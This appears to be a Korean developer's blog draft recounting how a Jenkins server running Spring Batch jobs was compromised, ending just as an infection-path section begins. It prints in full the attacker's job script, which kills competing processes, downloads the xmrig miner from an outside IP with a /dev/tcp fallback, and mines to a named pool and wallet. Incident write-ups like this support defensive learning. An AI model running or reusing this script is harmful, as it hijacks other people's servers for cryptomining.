---
title: "Jenkins 서버 해킹당한 썰"
category: "Jenkins"
tags: ["jenkins", "batch", "hacking"]
published: false
---

### 개요

 해킹을 당한 이 서버는 사연이 있다... 이미 해킹을 당한 적이 있는 서버였던 것이다.

 ![img1](/assets/img/2025-02-24-jenkins-hacking/img1.png)

 root 아이디의 비밀번호를 조금 쉬운걸로 해놨었는데 바로 해킹당했다. AWS에서는 키 파일로 로그인해서 생각도 하지 못하고 있었다가 안전불감증 당해버렸다. 서버를 만들어 놓고 다른 공부를 하고 있었는데 갑자기 며칠만에 크레딧이 모두 소진되었다는 문자가 날라왔다. 크레딧은 3달치 정도 사용할 수 있을텐데..? 하고 메일을 들어가보니 웬걸

  ![img2](/assets/img/2025-02-24-jenkins-hacking/img2.png)
  ![img3](/assets/img/2025-02-24-jenkins-hacking/img3.png)

  이 외에도 Dos 공격도 들어왔다고 하는데 비슷한 맥락인 것 같다. 마치 자전거 자물쇠 4자리를 0000부터 9999까지 모두 시도해보듯이 뚫릴 때까지 돌린건데 쉬운거라 뚫린 것이었다. 아침에 확인했는데 하자마자 잠이 깨며 식은 땀이 흘렀다.   
  
  내 서버 안에서 뭘 하는지 살펴볼 생각도 못해보고 일단 서버를 정지시켜놓은 다음에 고객센터에 손이 발이 되도록 빌었다. 예전에 AWS를 사용할 때 RDS에서 자동으로 주기적 스냅샷을 찍는 기능을 켜놓은 친구가 몇백만원 과금을 맞은 일이 있었다. 메일로 있는 영어 없는 영어 써가며 빌자 AWS에서는 "이번만 봐줄게 다음부턴 조심해 ㅇㅇ" 하면서 용서해줬던 일이 기억나서 나도 똑같이 한국어로 빌어보았다... 다행히 자비하신 네이버 클라우드는 없던 일로 해줬고 크레딧으로 쓰고 있던 vcpu 2개, RAM 4GB의 서버를 반납했다. 30만 크레딧은 날라갔지만 그게 중요한가 살아남는게 중요하지,, 그 후 1년동안 무료인 Micro 서버만 사용하고 있었던 것이다. 

  이 서버는 Spring Batch를 스케쥴링하는 서버로 쓰고 있는 Jenkins 서버이다. NCP Micro 서버로 무려 vcpu 1개, RAM 1GB를 지니고 있는 서버이다. 사양이 낮기 때문에 배치를 돌리는 것만으로도 허덕이며 vcpu가 1개인 탓인가 배치를 돌리는 중에는 Jenkins 페이지조차 들어가지 못하고, 뭔가 있어보이려고 모니터링 툴(Prometheus, Grafana)를 사용하고 있는데 cadvisor와 같은 에이전트와의 네트워크 I/O도 안됐다. 때문에 로그를 확인하거나 설정을 바꿔야할때면 Docker 위에서 돌아가는 Jenkins를 재시작하고 job들을 disabled한 후에 작업을 했다.   

  매일 당일 날짜에 해당하는 데이터가 잘 들어왔는지 DB 툴로 확인해보는데 며칠 다른 공부를 하다가 어느날 보니 데이터가 몇일치가 없는 것이었다! 가끔 원인미상의 오류로 Jenkins 자체가 멈추거나 API 스펙이 변경됐는데 모르고 업데이트를 안한 경우가 종종있어 며칠짜리 날렸구나 하면서 들어가봤는데...

  ![img4](/assets/img/2025-02-24-jenkins-hacking/img4.png)

  이 ^ㅐ끼뭐임?? 내가 만든게 아니다. 아무리 내가 하수여도 Jenkins 업데이트가 알아서 job으로 만들어져서 된다고??? 말도 안된다. 당장 들어가봤다(이미지는 최근에 찍은 것이다). 구성에 들어가보니 Build Steps - Execute shell에 이런 것들이 적혀있었다.

```bash
#!/bin/bash

ps aux | grep -v grep | grep -v "java\|redis\|weblogic\|mongod\|mysql\|oracle\|b52e75408\|tomcat\|grep\|postgres\|confluence\|awk\|aux\|sh"| awk "{if($3>60.0) print $2}" | xargs -I % kill -9 %

if [[ $(whoami) != "root" ]]; then
    for tr in $(ps -U $(whoami) | egrep -v "java|ps|sh|egrep|grep|PID" | cut -b1-6); do
        kill -9 $tr || : ;
    done;
fi

threadCount=$(lscpu | grep 'CPU(s)' | grep -v ',' | awk '{print $2}' | head -n 1);
hostHash=$(hostname -f | md5sum | cut -c1-8);
echo "${hostHash} - ${threadCount}";

_curl () {
  read proto server path <<<$(echo ${1//// })
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80

  exec 3<>/dev/tcp/${HOST}/$PORT
  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
  (while read line; do
   [[ "$line" == $'\r' ]] && break
  done && cat) <&3
  exec 3>&-
}

rm -rf config.json;

d () {
      curl -L --insecure --connect-timeout 5 --max-time 40 --fail $1 -o $2 2> /dev/null || wget --no-check-certificate --timeout 40 --tries 1 $1 -O $2 2> /dev/null || _curl $1 > $2;
}


test ! -s trace && \
    d http://118.189.172.141:8080/novoCRM/static/xmrig-6.4.0-linux-x64.tar.gz trace.tgz && \
    tar -zxvf trace.tgz && \
    mv xmrig-6.4.0/xmrig trace && \
    rm -rf xmrig-6.4.0 && \
    rm -rf trace.tgz;

test ! -x trace && chmod +x trace;

k() {
    ./trace \
        -r 2 \
        -R 2 \
        --keepalive \
        --no-color \
        --donate-level 1 \
        --max-cpu-usage 100 \
        --cpu-priority 3 \
        --print-time 25 \
        --threads ${threadCount:-4} \
        --url $1 \
        --user 85YFie9DTYSZtfZFSXLc3UJXqQAtWvcYc7qpR17rYxkUHa7ntTNFRsLPkFK7Ur3wp7EpJTJePTk8dSogBLquZbpR7d8Ri7e \
        --pass elf2 \
        --keepalive
}

k auto.c3pool.org:13333

```

 이 ^ㅐ끼 고수다. 봐도 모르겠다. Linux 명령어들이라 더 모르겠다. 하지만 화가 나니 천천히 파헤쳐보자
 
### 감염 경로
